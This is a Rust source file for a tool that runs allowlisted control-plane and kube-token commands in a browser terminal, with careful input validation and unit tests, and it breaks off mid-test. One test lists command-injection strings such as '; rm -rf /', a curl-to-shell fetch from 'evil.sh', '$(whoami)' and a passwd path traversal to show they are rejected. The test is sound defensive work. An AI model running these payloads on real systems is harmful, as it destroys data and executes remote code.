//! Interactive command sessions over a pseudo-terminal.
//!
//! Most of what runs here cannot be an API call. `rcc edit` opens the document in `$EDITOR`
//! and applies an optimistic-locked write when you quit; `rcc reconcile` prints a diff and
//! waits; `refresh-kube-token.sh` runs a multi-step encrypted action and reports progress as
//! it goes. All are real interactive processes, so the UI gets a real terminal rather than a
//! pretend one.
//!
//! `rcc get` is the exception, and it is here for **fidelity** rather than interactivity: the
//! equivalent tool parses the output and returns a value, which the UI then re-renders, so the
//! document on screen is a reconstruction rather than what `rcc` printed. Reading a raw
//! document is something you do when you suspect the summary, and a reconstruction is exactly
//! the wrong thing to hand someone in that moment.
//!
//! # The allowlist is the security boundary
//!
//! Everything else in this codebase that the web UI can reach is a *tool* — a fixed function
//! with a typed argument list. A PTY is not: it spawns a process and streams bytes both ways,
//! which is the shape of a remote shell. So the socket never carries a command string. It
//! carries a [`Request`] — a **kind** plus its inputs — and [`Request::resolve`] validates
//! those inputs and builds the argv here. A caller cannot name a program, add a flag, or
//! smuggle a shell metacharacter, because nothing they send is ever concatenated into a
//! command line. There is no shell in the path at all: [`CommandBuilder`] execs the binary
//! directly.
//!
//! The ids are checked against the entity cache as well as their shape, so the only things
//! editable are things MuggleBot has already seen in the estate.
//!
//! This is deliberately narrower than what the operator can do in their own terminal. That is
//! the point: the terminal is theirs, and this endpoint is reachable by anything that can
//! open a socket to the UI port.

use anyhow::{bail, Context as _, Result};
use portable_pty::{native_pty_system, CommandBuilder, MasterPty, PtySize};
use serde::{Deserialize, Serialize};
use std::io::{Read, Write};
use std::sync::Arc;
use tokio::sync::mpsc;
use tracing::{debug, warn};

use crate::cloud;
use crate::config;
use crate::store::Store;

/// Entity kinds whose state may be edited. Regions, api keys, users and Nuon installs are
/// deliberately absent: a region edit is a break-glass operation on shared infrastructure
/// (`rcc edit` warns that the non-admin path applies no server-side validation at all), and
/// the rest are not things an operator edits by hand from a dashboard.
const EDITABLE_KINDS: &[&str] = &["account", "environment", "organization", "group"];

/// What `rcc reconcile` accepts, and the reason editing is only half the job.
///
/// **An edit writes state; it does not apply it.** `rcc edit` says so itself, printing a tip
/// to reconcile afterwards — and a tip in a terminal the operator has just closed is exactly
/// the kind of instruction that gets missed. An environment left edited-but-unreconciled has
/// a control plane and a cluster that disagree, and nothing about the board would show it.
/// So reconcile is a first-class command here and the UI offers it the moment an edit
/// succeeds.
///
/// Regions are reconcilable but not editable: applying a region's existing state is an
/// ordinary operation, while hand-editing it is the break-glass path `rcc` warns about.
const RECONCILABLE_KINDS: &[&str] = &["environment", "region"];

/// The most environments one reconcile session will take.
///
/// A cap on the *session*, not on the operator: `rcc reconcile` diffs and confirms each id in
/// turn, so fifty is fifty diffs to read in one sitting, and a selection larger than that is
/// almost always a mis-click on a filter rather than an intention. Refused with the count and
/// the reason rather than silently truncated \u{2014} a bulk action that quietly does some of what
/// was asked is worse than one that refuses.
const MAX_RECONCILE: usize = 50;

/// The two access levels `refresh-kube-token.sh` accepts in operator mode.
const ACCESS_LEVELS: &[&str] = &["support", "admin"];

/// Offered token lifetimes. An allowlist rather than a free-text passthrough — the script
/// parses durations itself, but this argument is attacker-reachable and there is no reason
/// for it to be anything but one of these.
const DURATIONS: &[&str] = &["12h", "24h", "7d", "30d"];

/// What the browser may ask to run.
///
/// Note what this type does *not* have: a program, an argument list, or a working directory.
/// Those are decided in [`Request::resolve`] from the config and the validated inputs.
#[derive(Debug, Clone, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Request {
    /// `rcc get <id>` — the complete control-plane document, as `rcc` prints it.
    ///
    /// Read-only, and the only entry here that is. It runs through the terminal rather than
    /// the `cloud_entity_raw` tool because the two answer subtly different questions: the tool
    /// parses the output into JSON and hands back a value, which the UI then re-serialises —
    /// so what reached the screen was a *re-rendering* of the document with the key order
    /// changed and anything `rcc` printed that was not JSON silently dropped. When the reason
    /// you opened the raw document is that something looks wrong, a faithful copy is the whole
    /// point. The tool stays for MCP, where a parsed value is what a caller wants.
    ///
    /// Any cached platform id is fair game — there is nothing to protect against in reading a
    /// document the operator can already see summarised on the same screen.
    RccGet { id: String },
    /// `rcc edit <id>` — opens control-plane state in the editor and writes it back.
    RccEdit { id: String },
    /// `rcc reconcile <id>...` — diffs each stored state against its live cluster and applies
    /// it after a confirmation. The confirmation is the reason this is a terminal and not a
    /// button: it prints the diff and waits, and nobody should be applying a diff they were
    /// not shown. `--yes` is deliberately not reachable from here.
    ///
    /// **Several ids in one session, because `rcc reconcile` takes several** — it diffs and
    /// confirms each in turn. That is what makes a bulk reconcile safe to offer at all: the
    /// per-environment diff and its prompt are not skipped, they are queued. Rolling a profile
    /// change across twenty environments is one session with twenty confirmations rather than
    /// twenty trips through the page, and the operator still sees every diff.
    RccReconcile { ids: Vec<String> },
    /// Memory and storage as numbers, rather than as a JSON document in two unit systems.
    ///
    /// **This is `rcc edit`**, driven by a non-interactive `$EDITOR` — see
    /// [`resource_editor`]. It is the same write as [`Request::RccEdit`] and deliberately so:
    /// `rcc` has no command that sets an override, and the one this used to spawn
    /// (`rcc override`) did not exist at all. Going through `edit` keeps the optimistic lock,
    /// the server-side validation and the redacted-secret round trip rather than inventing a
    /// second write path with none of them.
    ///
    /// What it buys over editing by hand is the two conversions: storage is a raw byte count
    /// (`minimumStorageRequestBytes`), memory a Kubernetes quantity on **both** the request and
    /// the limit. The editor merges, so nothing else under `resourceOverrides` — replicas, env
    /// vars, tolerations — is lost on the way past.
    ///
    /// An empty override (neither field set) is refused rather than opening an editor that
    /// would change nothing: a button labelled "apply" that applies nothing is a bug report.
    RccOverride {
        id: String,
        /// Per-node memory request and limit. `None` leaves it as it is.
        memory_gib: Option<u32>,
        /// Volume floor. `None` leaves it as it is.
        storage_gib: Option<u32>,
    },
    /// `refresh-kube-token.sh <install> operator --access-level <lvl> --duration <dur>`.
    ///
    /// Operator mode only. The script's other mode mints a *permanent* cluster-admin service
    /// account token and prints it to stdout, which would put a standing credential into a
    /// browser DOM; an ephemeral token that writes a kubeconfig context does not.
    KubeToken {
        install: String,
        access_level: String,
        duration: String,
    },
}

/// A validated, ready-to-exec command. Built only by [`Request::resolve`].
#[derive(Debug, Clone)]
pub struct Spawn {
    pub program: String,
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
    /// What to show the operator above the terminal, so the pane says what it is running.
    pub label: String,
}

impl Request {
    /// Validate the inputs and build the command.
    ///
    /// Every id is checked twice: for *shape* (so it is the kind of thing it claims to be)
    /// and against the *cache* (so it is something that actually exists in the estate). The
    /// second check is what keeps this from being a way to run `rcc edit` on an arbitrary
    /// string, and it is why warming the estate is a prerequisite rather than a nicety.
    pub fn resolve(&self, cfg: &config::Cloud, store: &Store) -> Result<Spawn> {
        match self {
            Request::RccGet { id } => {
                cloud::kind_of(id).with_context(|| format!("{id} is not a platform id"))?;
                store
                    .get_cloud_entity(id)?
                    .with_context(|| format!("{id} is not in the entity cache"))?;
                let mut args = vec!["get".to_string(), id.clone()];
                if !cfg.context.trim().is_empty() {
                    args.push("-c".into());
                    args.push(cfg.context.clone());
                }
                Ok(Spawn {
                    program: expand_tilde(&cfg.rcc_path),
                    args,
                    env: Vec::new(),
                    label: format!("rcc get {id}"),
                })
            }
            Request::RccEdit { id } => {
                let kind =
                    cloud::kind_of(id).with_context(|| format!("{id} is not a platform id"))?;
                if !EDITABLE_KINDS.contains(&kind) {
                    bail!("{kind} state is not editable from here");
                }
                let known = store
                    .get_cloud_entity(id)?
                    .with_context(|| format!("{id} is not in the entity cache"))?;
                debug!("pty: editing {} ({})", known.id, known.kind);

                let mut args = vec!["edit".to_string(), id.clone()];
                if !cfg.context.trim().is_empty() {
                    args.push("-c".into());
                    args.push(cfg.context.clone());
                }
                Ok(Spawn {
                    program: expand_tilde(&cfg.rcc_path),
                    args,
                    // `rcc edit` shells out to `$EDITOR`, and this process may have none —
                    // a daemon started from launchd inherits almost no environment. An
                    // unset EDITOR would drop the session into whatever the tool defaults
                    // to, inside a pane that cannot recover from a GUI editor that never
                    // returns.
                    env: vec![("EDITOR".into(), cfg.editor.clone())],
                    label: format!("rcc edit {id}"),
                })
            }
            Request::RccReconcile { ids } => {
                if ids.is_empty() {
                    bail!("nothing to reconcile: select at least one environment");
                }
                if ids.len() > MAX_RECONCILE {
                    bail!(
                        "{} selected, and {MAX_RECONCILE} is the most one session will take \u{2014} \
                         reconcile in batches so the diffs stay readable",
                        ids.len()
                    );
                }
                // Every id is validated before any of them is spawned. A selection with one
                // bad entry is a mistake about the selection, and finding that out halfway
                // through a run of confirmations \u{2014} with some already applied \u{2014} is the worst
                // moment to find it out.
                let mut args = vec!["reconcile".to_string()];
                let mut seen = std::collections::HashSet::new();
                for id in ids {
                    let kind =
                        cloud::kind_of(id).with_context(|| format!("{id} is not a platform id"))?;
                    if !RECONCILABLE_KINDS.contains(&kind) {
                        // Parallel to the edit refusal, and articleless on purpose: "a account"
                        // is what the obvious phrasing produces.
                        bail!("{kind} state cannot be reconciled");
                    }
                    store
                        .get_cloud_entity(id)?
                        .with_context(|| format!("{id} is not in the entity cache"))?;
                    // A repeat would be diffed and confirmed twice, which reads as the tool
                    // having lost track rather than as the operator having double-clicked.
                    if seen.insert(id.clone()) {
                        args.push(id.clone());
                    }
                }
                if !cfg.context.trim().is_empty() {
                    args.push("-c".into());
                    args.push(cfg.context.clone());
                }
                let label = match ids.len() {
                    1 => format!("rcc reconcile {}", ids[0]),
                    n => format!("rcc reconcile \u{00d7} {n}"),
                };
                debug!("pty: reconciling {} entit(ies)", seen.len());
                Ok(Spawn {
                    program: expand_tilde(&cfg.rcc_path),
                    args,
                    env: Vec::new(),
                    label,
                })
            }
            Request::RccOverride {
                id,
                memory_gib,
                storage_gib,
            } => {
                let kind =
                    cloud::kind_of(id).with_context(|| format!("{id} is not a platform id"))?;
                // Only environments carry `resourceOverrides`. An account or a group has no
                // volume and no pod, so this is a shape error rather than a policy one.
                if kind != "environment" {
                    bail!("resource overrides apply to environments, not {kind}s");
                }
                store
                    .get_cloud_entity(id)?
                    .with_context(|| format!("{id} is not in the entity cache"))?;

                // Validate before building anything, so a bad number is an error on the
                // button rather than a terminal that opens only to print one.
                if let Some(gib) = memory_gib {
                    check_gib(*gib, "memory")?;
                }
                if let Some(gib) = storage_gib {
                    check_gib(*gib, "storage")?;
                }
                if memory_gib.is_none() && storage_gib.is_none() {
                    bail!("nothing to change: set a memory or a storage value");
                }

                let mut args = vec!["edit".to_string(), id.clone()];
                if !cfg.context.trim().is_empty() {
                    args.push("-c".into());
                    args.push(cfg.context.clone());
                }

                let what = match (memory_gib, storage_gib) {
                    (Some(m), Some(s)) => format!("memory {m}Gi · storage {s}Gi"),
                    (Some(m), None) => format!("memory {m}Gi"),
                    (None, Some(s)) => format!("storage {s}Gi"),
                    (None, None) => unreachable!("refused above"),
                };
                debug!("pty: setting resources on {id} ({what})");
                let editor = resource_editor(*memory_gib, *storage_gib)?;
                Ok(Spawn {
                    program: expand_tilde(&cfg.rcc_path),
                    args,
                    // **Both**, because `rcc` prefers `VISUAL` and falls back to `EDITOR`,
                    // and then to `vi`. Leaving either one pointing at the configured
                    // interactive editor would drop the pane into a text editor nobody is
                    // driving, on a document about to be written back to the control plane.
                    env: vec![("VISUAL".into(), editor.clone()), ("EDITOR".into(), editor)],
                    label: format!("rcc edit {id} · {what}"),
                })
            }
            Request::KubeToken {
                install,
                access_level,
                duration,
            } => {
                if !ACCESS_LEVELS.contains(&access_level.as_str()) {
                    bail!("access level must be one of {}", ACCESS_LEVELS.join(", "));
                }
                if !DURATIONS.contains(&duration.as_str()) {
                    bail!("duration must be one of {}", DURATIONS.join(", "));
                }
                let known = store
                    .get_cloud_entity(install)?
                    .with_context(|| format!("{install} is not in the entity cache"))?;
                if known.kind != cloud::NUON_KIND {
                    bail!("{install} is not a Nuon install (it is {})", known.kind);
                }
                let script = expand_tilde(&cfg.kube_token_script);
                if script.trim().is_empty() {
                    bail!("[cloud].kube_token_script is not configured");
                }
                Ok(Spawn {
                    program: script,
                    args: vec![
                        install.clone(),
                        "operator".into(),
                        "--access-level".into(),
                        access_level.clone(),
                        "--duration".into(),
                        duration.clone(),
                    ],
                    env: Vec::new(),
                    label: format!("kube token · {install} · {access_level} · {duration}"),
                })
            }
        }
    }
}

/// Reject a figure that is not a size.
///
/// **There is no ceiling, deliberately.** Overriding a resource is how an environment is given
/// more than its tier provides, so a cap here would refuse the exact case the feature exists
/// for — a contract environment that needs more than the largest published profile. What stops
/// a slipped decimal point is not a number in this file: the edit prints what it set, the
/// control plane validates the document, and nothing reaches the cluster until a reconcile the
/// operator reads a diff for.
///
/// Zero is still refused. It is not a smaller override, it is a broken one: a pod cannot request
/// no memory and a volume cannot be no bytes.
fn check_gib(gib: u32, what: &str) -> Result<()> {
    if gib == 0 {
        bail!("{what} must be greater than zero");
    }
    Ok(())
}

/// The `$EDITOR` that applies a resource override: this binary, in its non-interactive mode.
///
/// **Why an editor at all.** There is no `rcc` command that sets a resource override — this
/// code used to spawn `rcc override <id> --memory N`, which never existed, and the tests
/// asserted the argv rather than the outcome, so it passed CI while failing every time it was
/// pressed. The only supported way to change stored state is `rcc edit`: GetState → `$EDITOR
/// <file>` → PutState, optimistically locked and validated server-side. Standing in as the
/// editor keeps every one of those properties instead of inventing a second write path — and
/// MuggleBot still holds no credential of its own.
///
/// `rcc` splits the setting on whitespace (`spec.trim().split(/\s+/)`) and appends the file,
/// so the path to this binary must not contain any. Refused here with the reason rather than
/// silently launching the first path segment.
fn resource_editor(memory_gib: Option<u32>, storage_gib: Option<u32>) -> Result<String> {
    let exe = std::env::current_exe().context("locating this binary to act as rcc's editor")?;
    let exe = exe.to_string_lossy();
    if exe.split_whitespace().count() != 1 {
        bail!(
            "cannot set resources: `rcc` splits $EDITOR on whitespace and this binary's path \
             contains some ({exe}) — move or symlink it somewhere without spaces"
        );
    }
    let mut spec = format!("{exe} cloud-set-resources");
    if let Some(gib) = memory_gib {
        spec.push_str(&format!(" --memory {gib}"));
    }
    if let Some(gib) = storage_gib {
        spec.push_str(&format!(" --storage {gib}"));
    }
    Ok(spec)
}

/// A message from the browser.
#[derive(Debug, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ClientMsg {
    /// Start the session. Exactly one per socket — see [`Session`].
    Start {
        #[serde(flatten)]
        request: Request,
        rows: u16,
        cols: u16,
    },
    Input {
        data: String,
    },
    Resize {
        rows: u16,
        cols: u16,
    },
}

/// A message to the browser.
#[derive(Debug, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum ServerMsg {
    /// Echoes what is actually being run, so the pane can title itself with the real command
    /// rather than with what the client believes it asked for.
    Started {
        label: String,
    },
    Output {
        data: String,
    },
    Exit {
        code: i32,
    },
    Error {
        message: String,
    },
}

/// One running process on a pseudo-terminal.
///
/// One session per socket, for its whole life: a PTY is a process, and multiplexing several
/// down one socket would mean inventing session ids, ownership and cleanup rules for a pane
/// that only ever shows one thing at a time. Closing the socket kills the child.
pub struct Session {
    master: Box<dyn MasterPty + Send>,
    writer: Box<dyn Write + Send>,
    /// Output arrives here from a blocking reader thread.
    pub output: mpsc::Receiver<Vec<u8>>,
    /// Resolves once with the child's exit code.
    pub exit: tokio::sync::oneshot::Receiver<i32>,
    killer: Box<dyn portable_pty::ChildKiller + Send + Sync>,
}

impl Session {
    pub fn start(spawn: &Spawn, rows: u16, cols: u16) -> Result<Self> {
        let pair = native_pty_system()
            .openpty(PtySize {
                rows: rows.max(1),
                cols: cols.max(1),
                pixel_width: 0,
                pixel_height: 0,
            })
            .context("opening a pty")?;

        let mut cmd = CommandBuilder::new(&spawn.program);
        cmd.args(&spawn.args);
        for (k, v) in &spawn.env {
            cmd.env(k, v);
        }
        // A real terminal type, because the whole point is that `vim` and the script's
        // progress output behave normally. Everything else in this codebase sets `TERM=dumb`
        // and `NO_COLOR` for exactly the opposite reason — those calls are parsed, this one
        // is watched by a human.
        cmd.env("TERM", "xterm-256color");
        if let Some(home) = dirs::home_dir() {
            cmd.cwd(home);
        }

        let mut child = pair
            .slave
            .spawn_command(cmd)
            .with_context(|| format!("spawning `{}`", spawn.program))?;
        let killer = child.clone_killer();
        let mut reader = pair
            .master
            .try_clone_reader()
            .context("cloning pty reader")?;
        let writer = pair.master.take_writer().context("taking pty writer")?;
        drop(pair.slave);

        // The PTY's read side is blocking and has no async form, so it gets its own thread.
        // A bounded channel means a browser that stops reading eventually stalls the reader
        // rather than growing a buffer without limit.
        let (tx, output) = mpsc::channel::<Vec<u8>>(256);
        std::thread::spawn(move || {
            let mut buf = [0u8; 8192];
            loop {
                match reader.read(&mut buf) {
                    // EOF: the child closed the terminal.
                    Ok(0) => break,
                    Ok(n) => {
                        if tx.blocking_send(buf[..n].to_vec()).is_err() {
                            break;
                        }
                    }
                    Err(e) => {
                        debug!("pty: reader ended: {e}");
                        break;
                    }
                }
            }
        });

        let (exit_tx, exit) = tokio::sync::oneshot::channel();
        std::thread::spawn(move || {
            let code = match child.wait() {
                Ok(status) => status.exit_code() as i32,
                Err(e) => {
                    warn!("pty: waiting on child: {e}");
                    -1
                }
            };
            let _ = exit_tx.send(code);
        });

        Ok(Self {
            master: pair.master,
            writer,
            output,
            exit,
            killer,
        })
    }

    pub fn write(&mut self, data: &[u8]) -> Result<()> {
        self.writer.write_all(data)?;
        self.writer.flush()?;
        Ok(())
    }

    /// Tell the child its window changed. Without this `vim` renders for an 80×24 terminal
    /// inside whatever the browser pane actually is.
    pub fn resize(&self, rows: u16, cols: u16) -> Result<()> {
        self.master.resize(PtySize {
            rows: rows.max(1),
            cols: cols.max(1),
            pixel_width: 0,
            pixel_height: 0,
        })?;
        Ok(())
    }

    /// Kill the child. Called when the socket closes, so navigating away from the page does
    /// not leave an editor holding a lock on a control-plane document.
    pub fn kill(&mut self) {
        let _ = self.killer.kill();
    }
}

/// Everything the socket handler needs, without dragging the whole `AppState` in.
#[derive(Clone)]
pub struct PtyContext {
    pub cfg: config::Cloud,
    pub store: Arc<Store>,
}

fn expand_tilde(path: &str) -> String {
    match path.strip_prefix("~/") {
        Some(rest) => dirs::home_dir()
            .map(|h| h.join(rest).to_string_lossy().to_string())
            .unwrap_or_else(|| path.to_string()),
        None => path.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;

    fn cfg() -> config::Cloud {
        config::Cloud {
            enabled: true,
            rcc_path: "/bin/rcc".into(),
            kube_token_script: "/scripts/refresh-kube-token.sh".into(),
            editor: "vim".into(),
            context: "us".into(),
            ..Default::default()
        }
    }

    fn cached(store: &Store, id: &str, kind: &str) {
        store
            .put_cloud_entity(&cloud::Entity {
                id: id.into(),
                kind: kind.into(),
                name: None,
                status: None,
                fields: vec![],
                related: vec![],
                members: vec![],
                error: None,
                fetched_at: Utc::now(),
            })
            .unwrap();
    }

    /// The plumbing itself, on a harmless command: a real pty, a real child, output arriving
    /// on the channel and an exit code on the oneshot. Everything else here tests what gets
    /// *built*; this tests that running it works.
    #[tokio::test]
    async fn a_session_streams_output_and_reports_its_exit_code() {
        let spawn = Spawn {
            program: "/bin/echo".into(),
            args: vec!["hello from the pty".into()],
            env: vec![],
            label: "echo".into(),
        };
        let mut session = Session::start(&spawn, 24, 80).unwrap();
        let mut seen = String::new();
        // A pty delivers in chunks; echo is small enough to arrive in one, but nothing
        // guarantees that, so read until the child exits.
        let code = loop {
            tokio::select! {
                chunk = session.output.recv() => {
                    if let Some(bytes) = chunk {
                        seen.push_str(&String::from_utf8_lossy(&bytes));
                    }
                }
                code = &mut session.exit => break code.unwrap(),
            }
        };
        while let Ok(bytes) = session.output.try_recv() {
            seen.push_str(&String::from_utf8_lossy(&bytes));
        }
        assert_eq!(code, 0);
        assert!(seen.contains("hello from the pty"), "got {seen:?}");
    }

    /// A child must die with its socket, or an abandoned editor sits on a control-plane
    /// document indefinitely.
    #[tokio::test]
    async fn killing_a_session_ends_the_child() {
        let spawn = Spawn {
            program: "/bin/cat".into(), // reads until closed
            args: vec![],
            env: vec![],
            label: "cat".into(),
        };
        let mut session = Session::start(&spawn, 24, 80).unwrap();
        session.kill();
        // Generous on purpose. The bound is here to fail a *hang* rather than to assert a
        // speed, and this spawns a real process — on a loaded machine a tight deadline turns
        // an unrelated build into a red test.
        let code = tokio::time::timeout(std::time::Duration::from_secs(30), &mut session.exit)
            .await
            .expect("the child exited rather than hanging")
            .unwrap();
        assert_ne!(code, 0, "a killed child does not exit cleanly");
    }

    #[test]
    fn an_editable_entity_resolves_to_an_exec_with_no_shell_in_it() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let spawn = Request::RccEdit {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
        }
        .resolve(&cfg(), &store)
        .unwrap();
        assert_eq!(spawn.program, "/bin/rcc");
        assert_eq!(
            spawn.args,
            vec!["edit", "env_201kpvffchrm1sq5p0qph42dqev", "-c", "us"]
        );
        // The editor is supplied, because a daemon may have inherited none.
        assert!(spawn.env.contains(&("EDITOR".into(), "vim".into())));
    }

    /// The check that stops this being "run `rcc edit` on any string you like". An id of the
    /// right shape that the estate has never seen is refused.
    #[test]
    fn an_id_the_estate_has_never_seen_is_refused() {
        let store = Store::open_in_memory().unwrap();
        let err = Request::RccEdit {
            id: "env_201kpvffchrm1sq5p0qph42dqev".into(),
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("not in the entity cache"));
    }

    /// Regions and api keys are real, cached, and still not editable from a dashboard.
    #[test]
    fn only_the_four_editable_kinds_are_editable() {
        let store = Store::open_in_memory().unwrap();
        for (id, kind) in [
            ("rgn_26p9031nve", "region"),
            ("key_10vkhgbtpzFTNSWc2RnOY1S", "apikey"),
            ("usr_10uXl8CPozSuQiKolKUfqVI", "user"),
        ] {
            cached(&store, id, kind);
            let err = Request::RccEdit { id: id.into() }
                .resolve(&cfg(), &store)
                .unwrap_err();
            assert!(
                format!("{err:#}").contains("not editable"),
                "{kind} was allowed"
            );
        }
        // And the four that are.
        for (id, kind) in [
            ("acc_10vk05bJNjt1nLXvId4zh14", "account"),
            ("env_201kpvffchrm1sq5p0qph42dqev", "environment"),
            ("org_10vj37k7NcqTaIavuJRsOcv", "organization"),
            ("grp_10vk02G8Ne9ftq7xOI3FJmE", "group"),
        ] {
            cached(&store, id, kind);
            Request::RccEdit { id: id.into() }
                .resolve(&cfg(), &store)
                .unwrap_or_else(|e| panic!("{kind} refused: {e:#}"));
        }
    }

    /// An edit writes state; only a reconcile applies it. The pair is the whole operation, so
    /// reconcile is reachable in its own right rather than being something the operator has
    /// to remember from a tip printed in a pane they just closed.
    #[test]
    fn an_environment_can_be_reconciled_and_the_confirmation_is_not_skippable() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        let spawn = Request::RccReconcile {
            ids: vec!["env_201kpvffchrm1sq5p0qph42dqev".into()],
        }
        .resolve(&cfg(), &store)
        .unwrap();
        assert_eq!(
            spawn.args,
            vec!["reconcile", "env_201kpvffchrm1sq5p0qph42dqev", "-c", "us"]
        );
        // Applying without being shown the diff is not something this endpoint can express.
        assert!(!spawn.args.iter().any(|a| a == "-y" || a == "--yes"));
    }

    /// Several environments in one session, which is what makes a bulk reconcile safe to
    /// offer: `rcc reconcile` diffs and confirms **each** id in turn, so the per-environment
    /// prompt is queued rather than skipped. Nothing here can express skipping it.
    #[test]
    fn several_environments_reconcile_in_one_session_with_every_diff_still_shown() {
        let store = Store::open_in_memory().unwrap();
        for id in [
            "env_201kpvffchrm1sq5p0qph42dqev",
            "env_201kpe1278xqa4ne187w8fbp640",
            "env_201kpnvpgbbn7q4g2ge28yh2rz1",
        ] {
            cached(&store, id, "environment");
        }
        let spawn = Request::RccReconcile {
            ids: vec![
                "env_201kpvffchrm1sq5p0qph42dqev".into(),
                "env_201kpe1278xqa4ne187w8fbp640".into(),
                // A repeat: diffing and confirming the same environment twice reads as the
                // tool having lost track, not as the operator having double-clicked.
                "env_201kpvffchrm1sq5p0qph42dqev".into(),
                "env_201kpnvpgbbn7q4g2ge28yh2rz1".into(),
            ],
        }
        .resolve(&cfg(), &store)
        .unwrap();
        assert_eq!(
            spawn.args,
            vec![
                "reconcile",
                "env_201kpvffchrm1sq5p0qph42dqev",
                "env_201kpe1278xqa4ne187w8fbp640",
                "env_201kpnvpgbbn7q4g2ge28yh2rz1",
                "-c",
                "us"
            ]
        );
        assert!(!spawn.args.iter().any(|a| a == "-y" || a == "--yes"));
        assert_eq!(spawn.label, "rcc reconcile \u{00d7} 4");
    }

    /// One bad id refuses the whole selection, before anything is spawned.
    ///
    /// Validating as it went would mean discovering the mistake part-way through a run of
    /// confirmations, with some environments already applied \u{2014} the worst possible moment,
    /// because half a bulk reconcile is a state nothing else in the system can describe.
    #[test]
    fn one_unreconcilable_id_refuses_the_whole_selection() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        cached(&store, "acc_10vk05bJNjt1nLXvId4zh14", "account");
        let err = Request::RccReconcile {
            ids: vec![
                "env_201kpvffchrm1sq5p0qph42dqev".into(),
                "acc_10vk05bJNjt1nLXvId4zh14".into(),
            ],
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("cannot be reconciled"));

        // An id nobody has ever seen fails the same way, for the same reason.
        assert!(Request::RccReconcile {
            ids: vec![
                "env_201kpvffchrm1sq5p0qph42dqev".into(),
                "env_201k479bd9ch7aw899my63z2pkr".into(),
            ],
        }
        .resolve(&cfg(), &store)
        .is_err());

        // And an empty selection is refused rather than spawning a bare `rcc reconcile`.
        assert!(Request::RccReconcile { ids: vec![] }
            .resolve(&cfg(), &store)
            .is_err());
    }

    /// The cap is named, not silent: a bulk action that quietly does some of what was asked
    /// is worse than one that refuses.
    #[test]
    fn a_selection_past_the_session_cap_is_refused_with_the_count() {
        let store = Store::open_in_memory().unwrap();
        let ids: Vec<String> = (0..MAX_RECONCILE + 1)
            .map(|i| {
                let id = format!("env_201kpvffchrm1sq5p0qph42dq{i:03}");
                cached(&store, &id, "environment");
                id
            })
            .collect();
        let err = Request::RccReconcile { ids }
            .resolve(&cfg(), &store)
            .unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains(&(MAX_RECONCILE + 1).to_string()), "{msg}");
        assert!(msg.contains("batches"), "{msg}");
    }

    /// Regions reconcile but do not edit; accounts edit but do not reconcile. The two lists
    /// are different because the commands accept different things.
    #[test]
    fn the_reconcilable_kinds_are_not_the_editable_ones() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "rgn_26p9031nve", "region");
        cached(&store, "acc_10vk05bJNjt1nLXvId4zh14", "account");

        // A region: reconcilable, not editable.
        assert!(Request::RccReconcile {
            ids: vec!["rgn_26p9031nve".into()]
        }
        .resolve(&cfg(), &store)
        .is_ok());
        assert!(Request::RccEdit {
            id: "rgn_26p9031nve".into()
        }
        .resolve(&cfg(), &store)
        .is_err());

        // An account: editable, nothing to reconcile.
        assert!(Request::RccEdit {
            id: "acc_10vk05bJNjt1nLXvId4zh14".into()
        }
        .resolve(&cfg(), &store)
        .is_ok());
        let err = Request::RccReconcile {
            ids: vec!["acc_10vk05bJNjt1nLXvId4zh14".into()],
        }
        .resolve(&cfg(), &store)
        .unwrap_err();
        assert!(format!("{err:#}").contains("cannot be reconciled"));
    }

    /// Nothing a caller sends is concatenated into a command line, so the classic injections
    /// have nowhere to land — they fail as *unknown ids*, before any argv exists.
    #[test]
    fn shell_metacharacters_never_reach_a_command_line() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "env_201kpvffchrm1sq5p0qph42dqev", "environment");
        for hostile in [
            "env_201kpvffchrm1sq5p0qph42dqev; rm -rf /",
            "env_201kpvffchrm1sq5p0qph42dqev && curl evil.sh | sh",
            "$(whoami)",
            "../../etc/passwd",
            "-c",
        ] {
            assert!(
                Request::RccEdit { id: hostile.into() }
                    .resolve(&cfg(), &store)
                    .is_err(),
                "{hostile:?} was accepted"
            );
        }
    }

    /// Operator mode, and only the offered levels and lifetimes.
    #[test]
    fn a_kube_token_is_operator_mode_with_an_allowlisted_level_and_duration() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "inltao53ge1b4pab3zo23si077", cloud::NUON_KIND);
        let spawn = Request::KubeToken {
            install: "inltao53ge1b4pab3zo23si077".into(),
            access_level: "admin".into(),
            duration: "7d".into(),
        }
        .resolve(&cfg(), &store)
        .unwrap();
        assert_eq!(spawn.program, "/scripts/refresh-kube-token.sh");
        assert_eq!(
            spawn.args,
            vec![
                "inltao53ge1b4pab3zo23si077",
                "operator",
                "--access-level",
                "admin",
                "--duration",
                "7d"
            ]
        );
        // `cluster` mode mints a permanent credential; it is not reachable from here at all.
        assert!(!spawn.args.iter().any(|a| a == "cluster"));
    }

    #[test]
    fn an_unoffered_access_level_or_duration_is_refused() {
        let store = Store::open_in_memory().unwrap();
        cached(&store, "inltao53ge1b4pab3zo23si077", cloud::NUON_KIND);
        let req = |level: &str, dur: &str| {
            Request::KubeToken {
                install: "inltao53ge1b4pab3zo23si077".into(),
                access_level: level.into(),
                duration: dur.into(),
            }
            .resolve(&cfg(), &store)
        };
        assert!(req("root", "24h").is_err());
        assert!(req("admin", "99y").is_err());
        assert!(req("admin", "24h; id").is_err());
        assert!(req("admin", "24h").is_ok());
    }

    /// A token request aimed at something that is not an install — an environment id pasted
    /// into the wrong field — is refused rather than handed to the script.
    #[test]
    fn a_kube_token_needs_an_actual_install() {
        let store = Store::open_in_memory().unwrap();
